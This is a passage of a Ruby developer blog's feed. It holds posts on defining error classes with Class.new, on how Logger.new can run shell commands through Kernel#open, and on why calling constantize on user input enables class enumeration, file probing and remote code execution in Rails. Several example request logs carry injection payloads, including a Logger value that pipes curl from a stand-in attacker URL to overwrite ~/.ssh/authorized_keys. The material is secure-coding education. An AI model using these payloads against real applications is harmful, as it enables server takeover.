</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="no">Curl</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">execute</span>
</span></code></pre></td></tr></table></div></figure>


<p><aside>
The first thing to notice is that this is a silly example, you&rsquo;d likely never want to re-implement curl&rsquo;s errors like that!
</aside></p>

<p>Notice that we&rsquo;re declaring three custom error classes <code>CurlUnsupportedProtocolError</code>,
<code>CurlFailedInitError</code>, and <code>CurlURLMalformatError</code>. As you can imagine, if we completed this for all 80 or so
<code>CURLE</code> exception codes we&rsquo;d have a long list of errors.</p>

<p>We could use semi-colons to simplify things:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># That&#39;s ugly!</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlUnsupportedProtocolError</span> <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlFailedInitError</span> <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlURLMalformatError</span> <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Better, but still ugly</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlUnsupportedProtocolError</span>  <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlFailedInitError</span>           <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span><span class='line'><span class="k">class</span> <span class="nc">CurlURLMalformatError</span>         <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>But I&rsquo;m not particularly a fan of that syntax. Instead you can use some shorthand syntax
from Ruby&rsquo;s <a href="https://ruby-doc.org/core-1.9.3/Class.html"><code>Class</code></a> definitions. Because even Ruby&rsquo;s classes
are classes! Very Wow! :doge:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Using Class.new from https://ruby-doc.org/core-1.9.3/Class.html#method-c-new</span>
</span><span class='line'><span class="no">CurlUnsupportedProtocolError</span> <span class="o">=</span> <span class="no">Class</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">StandardError</span><span class="p">)</span>
</span><span class='line'><span class="no">CurlFailedInitError</span>          <span class="o">=</span> <span class="no">Class</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">StandardError</span><span class="p">)</span>
</span><span class='line'><span class="no">CurlURLMalformatError</span>        <span class="o">=</span> <span class="no">Class</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">StandardError</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>Class.new</code> will create an anonymous class using the value passed in as the superclass. And then we assign
it to our constants and viola! We get a new set of error classes.</p>

<p>Since seeing the above error syntax, it&rsquo;s the one I like to stick with in all of my code because of the
readability of it. I&rsquo;ve never come across any other application of <code>Class.new</code>, although I&rsquo;m sure there are
some if I went looking.</p>

<p>Hope this is something you&rsquo;ll find useful!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What makes Logger Susceptible to RCE?]]></title>
    <link href="http://gavinmiller.io/2016/how-is-logger-susceptible-to-rce/">
    <updated>2016-12-11T17:19:00-07:00</updated>
    <id>http://gavinmiller.io/2016/how-is-logger-susceptible-to-rce</id>
    <content type="html"><![CDATA[<p><aside>
This is a guest post from <a href="https://github.com/tom-lord">Tom Lord</a>. Tom put together
<a href="https://www.reddit.com/r/ruby/comments/54io0k/the_safest_way_to_constantize/d82h3vr/">an awesome response</a>
to my post on <a href="http://gavinmiller.io/2016/the-safesty-way-to-constantize/">why constantize is a dangerous method</a>, and he gave me
his permission to share it here. He expands on <em>what</em> makes <code>Logger</code> vulnerable to crafting an RCE.
</aside></p>

<p>The issue is not specifically the use of constantize; it&rsquo;s to do with trusting user input not to be
malicious. In order to make an application secure, you must consider all user input to be potentially
malicious. There are plenty of convenient use cases for constantizing code, and security is unlikely
to be an issue if there&rsquo;s no user input involved.</p>

<p>However, I did find this hacking technique interesting/surprising, as I&rsquo;ve never seen it before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Logger</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;|curl http://attacker.url -o ~/.ssh/authorized_keys&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can really run arbitrary shell scripts by simply creating an instance of <code>Logger</code>??!! I looked into
this, and it&rsquo;s true. Here&rsquo;s a full breakdown, for the curious:</p>

<p><a href="https://github.com/ruby/ruby/blob/trunk/lib/logger.rb#L377-L391">Creating a new instance of <code>Logger</code></a>
instantiates a new instance of <code>LogDevice</code>, with the given &ldquo;filename&rdquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">logdev</span><span class="p">,</span> <span class="n">shift_age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">shift_size</span> <span class="o">=</span> <span class="mi">1048576</span><span class="p">,</span> <span class="ss">level</span><span class="p">:</span> <span class="no">DEBUG</span><span class="p">,</span>
</span><span class='line'>                 <span class="ss">progname</span><span class="p">:</span> <span class="kp">nil</span><span class="p">,</span> <span class="ss">formatter</span><span class="p">:</span> <span class="kp">nil</span><span class="p">,</span> <span class="n">datetime_format</span><span class="p">:</span> <span class="kp">nil</span><span class="p">,</span>
</span><span class='line'>                 <span class="n">shift_period_suffix</span><span class="p">:</span> <span class="s1">&#39;%Y%m%d&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c1"># ....</span>
</span><span class='line'>  <span class="vi">@logdev</span> <span class="o">=</span> <span class="kp">nil</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">logdev</span>
</span><span class='line'>    <span class="vi">@logdev</span> <span class="o">=</span> <span class="no">LogDevice</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">logdev</span><span class="p">,</span> <span class="ss">:shift_age</span> <span class="o">=&gt;</span> <span class="n">shift_age</span><span class="p">,</span>
</span><span class='line'>      <span class="ss">:shift_size</span> <span class="o">=&gt;</span> <span class="n">shift_size</span><span class="p">,</span>
</span><span class='line'>      <span class="ss">:shift_period_suffix</span> <span class="o">=&gt;</span> <span class="n">shift_period_suffix</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/ruby/ruby/blob/7b2d47132ff8ee950b0f978ab772dee868d9f1b0/lib/logger.rb#L668-L678">The <code>LogDevice</code> initializer</a>
calls <code>set_dev</code> with the supplied &ldquo;filename&rdquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">log</span> <span class="o">=</span> <span class="kp">nil</span><span class="p">,</span> <span class="n">shift_age</span><span class="p">:</span> <span class="kp">nil</span><span class="p">,</span> <span class="n">shift_size</span><span class="p">:</span> <span class="kp">nil</span><span class="p">,</span> <span class="n">shift_period_suffix</span><span class="p">:</span> <span class="kp">nil</span><span class="p">)</span>
</span><span class='line'>  <span class="c1"># ...</span>
</span><span class='line'>  <span class="n">set_dev</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span><span class='line'>  <span class="c1"># ...</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; <a href="https://github.com/ruby/ruby/blob/7b2d47132ff8ee950b0f978ab772dee868d9f1b0/lib/logger.rb#L728-L736">Which calls</a>
<code>open_logfile</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">set_dev</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">log</span><span class="o">.</span><span class="n">respond_to?</span><span class="p">(</span><span class="ss">:write</span><span class="p">)</span> <span class="ow">and</span> <span class="n">log</span><span class="o">.</span><span class="n">respond_to?</span><span class="p">(</span><span class="ss">:close</span><span class="p">)</span>
</span><span class='line'>    <span class="vi">@dev</span> <span class="o">=</span> <span class="n">log</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="vi">@dev</span> <span class="o">=</span> <span class="n">open_logfile</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span><span class='line'>    <span class="c1"># ...</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; <a href="https://github.com/ruby/ruby/blob/7b2d47132ff8ee950b0f978ab772dee868d9f1b0/lib/logger.rb#L738-L744">Which calls</a>
<code>Kernel#open</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">open_logfile</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span><span class='line'>  <span class="k">begin</span>
</span><span class='line'>    <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="p">(</span><span class="ss">File</span><span class="p">:</span><span class="ss">:WRONLY</span> <span class="o">|</span> <span class="ss">File</span><span class="p">:</span><span class="ss">:APPEND</span><span class="p">))</span>
</span><span class='line'>  <span class="k">rescue</span> <span class="ss">Errno</span><span class="p">:</span><span class="ss">:ENOENT</span>
</span><span class='line'>    <span class="n">create_logfile</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, looking at the documentation for <code>Kernel#open</code>:</p>

<blockquote><p>Creates an IO object connected to the given stream, file, or subprocess.
If path does not start with a pipe character (|), treat it as the name of a file to open
using the specified mode (defaulting to &ldquo;r&rdquo;).</p>

<p>[&hellip;]</p>

<p>If path starts with a pipe character (&ldquo;|&rdquo;), a subprocess is created, connected to the caller
by a pair of pipes. The returned IO object may be used to write to the standard input and
read from the standard output of this subprocess.</p>

<p>If the command following the pipe is a single minus sign (&ldquo;|&ndash;&rdquo;), Ruby forks, and this subprocess
is connected to the parent. If the command is not &ldquo;&ndash;&rdquo;, the subprocess runs the command. [&hellip;]</p></blockquote>

<p>Wow, that&rsquo;s definitely a possible attack vendor to be aware of!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Safest Way to Constantize...]]></title>
    <link href="http://gavinmiller.io/2016/the-safesty-way-to-constantize/">
    <updated>2016-09-25T07:11:00-06:00</updated>
    <id>http://gavinmiller.io/2016/the-safesty-way-to-constantize</id>
    <content type="html"><![CDATA[<p>This post examines what the safest way to <code>constantize</code> is: which is <strong>NEVER</strong>.
That&rsquo;s right. If you have the <code>constantize</code> method anywhere within your Rails codebase you are asking for trouble!</p>

<p>This post looks at the most common usage of <code>constantize</code>, how <code>constantize</code> can be exploited, and a safe alternative to using it.</p>

<h2>Common Constantize Usage</h2>

<p><img src="http://gavinmiller.io/images/constantize/basic-form.png" alt="Basic radio select form for creating alerts" /></p>

<p>The most common pattern that I&rsquo;ve seen across many codebases is a form that manages multiple selections
(like the one above).  Within that form&rsquo;s controller code <code>constantize</code> is called on a param
controlled by the user. Here&rsquo;s an example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">class</span> <span class="nc">AlertsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">create</span>
</span><span class='line'>    <span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:type</span><span class="o">].</span><span class="n">constantize</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:value</span><span class="o">]</span><span class="p">)</span>  <span class="c1"># &lt;-- bad code don&#39;t do this!</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># ... other work</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># render page</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running brakeman over this code it is going to report a constantize RCE vulnerability like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="no">Confidence</span>   <span class="o">|</span> <span class="no">High</span>                                                                        <span class="o">|</span>
</span><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="no">Class</span>        <span class="o">|</span> <span class="no">AlertsController</span>                                                            <span class="o">|</span>
</span><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="no">Method</span>       <span class="o">|</span> <span class="n">create</span>                                                                      <span class="o">|</span>
</span><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="no">Warning</span> <span class="no">Type</span> <span class="o">|</span> <span class="no">Remote</span> <span class="no">Code</span> <span class="no">Execution</span>                                                       <span class="o">|</span>
</span><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="no">Message</span>      <span class="o">|</span> <span class="no">Unsafe</span> <span class="n">reflection</span> <span class="nb">method</span> <span class="n">constantize</span> <span class="n">called</span> <span class="n">with</span> <span class="n">parameter</span> <span class="n">value</span> <span class="n">near</span>       <span class="o">|</span>
</span><span class='line'><span class="o">|</span>              <span class="o">|</span>   <span class="n">line</span> <span class="mi">7</span><span class="p">:</span> <span class="o">+</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:type</span><span class="o">].</span><span class="n">constantize</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:alert</span><span class="o">][</span><span class="ss">:value</span><span class="o">]</span><span class="p">)</span><span class="o">&gt;&gt;</span>  <span class="o">|</span>
</span><span class='line'><span class="o">+--------------+-----------------------------------------------------------------------------+</span>
</span></code></pre></td></tr></table></div></figure>


<p>What confused me when I first encounter this error was the <strong>Remote Code Execution</strong> warning type.
Looking at that code, I found it hard to figure out how an attacker could trigger an exploit.</p>

<h2>Pivoting Constantize into an Exploit</h2>

<p>Let&rsquo;s look at how an attacker can turn this into an exploit. There are a couple types of exploits that an attacker
could trigger:</p>

<ul>
<li>Reconnaissance

<ul>
<li>Application</li>
<li>Server</li>
</ul>
</li>
<li>Command Injection (RCE)</li>
</ul>


<p>The worst item in this list is Command Injection/RCE. In the event that a controller is filtering input and
an RCE payload cannot be sent, Application and Server Reconnaissance may still be useful.</p>

<p><aside>
The exploits below are adapted and update from <a href="http://blog.conviso.com.br/exploiting-unsafe-reflection-in-rubyrails-applications/">Gabriel Quadros&#8217; original work on the subject</a>.
</aside></p>

<h3>Reconnaissance (Application)</h3>

<p>The first type of exploit is performing class enumeration to investigate what classes exist within an
application.</p>

<p>Below is an example of an unsuccessful class discovery because the server returns a <code>500</code> error. The attacker
knows that a <code>SocialInsuranceNumber</code> class does not exist.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;SocialInsuranceNumber&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;&quot;</span><span class="p">}}</span>  <span class="c1"># &lt;-- payload</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">500</span> <span class="no">Internal</span> <span class="no">Server</span> <span class="no">Error</span> <span class="k">in</span> <span class="mi">1</span><span class="n">ms</span> <span class="p">(</span><span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>         <span class="c1"># &lt;-- failed</span>
</span></code></pre></td></tr></table></div></figure>


<p>However in this next example, since the server returns a <code>200</code> success message, the attacker knows that a
<code>CreditCard</code> class exists.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;CreditCard&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;&quot;</span><span class="p">}}</span>  <span class="c1"># &lt;-- payload</span>
</span><span class='line'>  <span class="no">Rendered</span> <span class="n">text</span> <span class="n">template</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">200</span> <span class="no">OK</span> <span class="k">in</span> <span class="mi">8</span><span class="n">ms</span> <span class="p">(</span><span class="ss">Views</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">5</span><span class="n">ms</span> <span class="o">|</span> <span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="n">ms</span><span class="p">)</span>  <span class="c1"># &lt;-- success</span>
</span></code></pre></td></tr></table></div></figure>


<p>Obviously this technique is tedious by hand (less so with a script), and it would take a fair amount of time to
enumerate an entire application. This type of exploit provides interesting visibility into
the application&rsquo;s data like Payments, Invoices, Social Insurance Numbers, Credit Cards, etc. and information about 3rd party
code used within the app: Devise, Nokogiri, Puma, Stripe, etc. All this information helps an attacker evaluate
what attack surfaces exist and whether the application is worth spending time hacking.</p>

<h3>Reconnaissance (Server)</h3>

<p>The second type of exploit, similar to application reconnaissance is server recon. This method uses a similar
tactic by using the <code>File</code> class from the Ruby standard library and passing a filename. If the server returns a <code>500</code> error you
know the file doesn&rsquo;t exist:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;floop-de-doop&quot;</span><span class="p">}}</span> <span class="c1"># &lt;-- does floop-de-doop exist?</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">500</span> <span class="no">Internal</span> <span class="no">Server</span> <span class="no">Error</span> <span class="k">in</span> <span class="mi">1</span><span class="n">ms</span> <span class="p">(</span><span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>    <span class="c1"># &lt;-- nope</span>
</span></code></pre></td></tr></table></div></figure>


<p>And if you get a <code>200</code> you know the file exists:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">}}</span>  <span class="c1"># &lt;-- does /etc/passwd exist?</span>
</span><span class='line'>  <span class="no">Rendered</span> <span class="n">text</span> <span class="n">template</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">200</span> <span class="no">OK</span> <span class="k">in</span> <span class="mi">1</span><span class="n">ms</span> <span class="p">(</span><span class="ss">Views</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span> <span class="o">|</span> <span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>       <span class="c1"># &lt;-- success</span>
</span></code></pre></td></tr></table></div></figure>


<p>This type of technique enables an attacker to determine information like what OS your app is running on, what
type of database you&rsquo;re using, or what other services are running on your machine. Again this creates a broader picture
of the attack surface available against your app.</p>

<h3>Command Injection</h3>

<p>And the worst exploit for last: Getting an RCE. It&rsquo;s actually easy to trigger an RCE in Rails using the
<code>Logger</code> class. Here&rsquo;s an example of getting the server to print the current date to console:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;Logger&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;|date&quot;</span><span class="p">}}</span>  <span class="c1"># &lt;-- Injected params</span>
</span><span class='line'>  <span class="no">Rendered</span> <span class="n">text</span> <span class="n">template</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">200</span> <span class="no">OK</span> <span class="k">in</span> <span class="mi">3</span><span class="n">ms</span> <span class="p">(</span><span class="ss">Views</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">7</span><span class="n">ms</span> <span class="o">|</span> <span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
</span><span class='line'><span class="no">Sun</span> <span class="mi">25</span> <span class="no">Sep</span> <span class="mi">2016</span> <span class="mi">21</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">23</span> <span class="no">MDT</span>                                   <span class="c1"># &lt;-- Ooops!</span>
</span></code></pre></td></tr></table></div></figure>


<p>Date isn&rsquo;t a &ldquo;bad&rdquo; command to have run on your server, but what about other parameters that you could inject:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Started</span> <span class="no">POST</span> <span class="s2">&quot;/alerts&quot;</span>
</span><span class='line'><span class="no">Processing</span> <span class="n">by</span> <span class="no">AlertsController</span><span class="c1">#create as HTML</span>
</span><span class='line'>  <span class="ss">Parameters</span><span class="p">:</span> <span class="p">{</span>
</span><span class='line'>    <span class="s2">&quot;alert&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;Logger&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;value&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;|curl http://attacker.url -o ~/.ssh/authorized_keys&quot;</span><span class="p">}}</span>    <span class="c1"># &lt;-- Injected params</span>
</span><span class='line'>  <span class="no">Rendered</span> <span class="n">text</span> <span class="n">template</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
</span><span class='line'><span class="no">Completed</span> <span class="mi">200</span> <span class="no">OK</span> <span class="k">in</span> <span class="mi">6</span><span class="n">ms</span> <span class="p">(</span><span class="ss">Views</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">6</span><span class="n">ms</span> <span class="o">|</span> <span class="ss">ActiveRecord</span><span class="p">:</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="n">ms</span><span class="p">)</span>
